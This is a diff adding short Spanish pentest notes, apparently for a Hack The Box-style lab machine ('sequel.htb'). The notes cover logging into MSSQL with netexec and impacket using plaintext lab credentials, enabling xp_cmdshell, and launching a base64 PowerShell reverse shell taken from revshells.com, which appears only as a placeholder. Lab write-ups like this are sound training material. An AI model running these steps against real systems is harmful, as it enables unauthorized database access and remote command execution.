@@ -1,0 +1,33 @@
+
+- Primero probar si podemos acceder con credenciales
+```bash
+netexec mssql 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su'
+```
+- Nos conectamos
+```bash
+impacket-mssqlclient -windows-auth 10.10.11.51/rose:KxEPkKe6R8su@dc01.sequel.htb
+```
+- Comandos dentro del mssql
+```sql
+SQL (SEQUEL\rose  guest@master)> select name from sys.databases;
+```
+
+- Ver si tengo permisos
+```sql
+SQL (SEQUEL\rose  guest@master)> xp_cmdshell whoami
+SQL (SEQUEL\rose  guest@master)> enable_xp_cmdshell
+```
+
+- Si el usuario es local prueba sin el auth
+```bash
+impacket-mssqlclient '10.10.11.51/sa:MSSQLP@ssw0rd!@dc01.sequel.htb'
+```
+
+### Revshell
+
+- https://www.revshells.com/
+- La de Powershell #3 (base64)
+
+```bash
+SQL (sa  dbo@master)> xp_cmdshell REVSHELL
+```
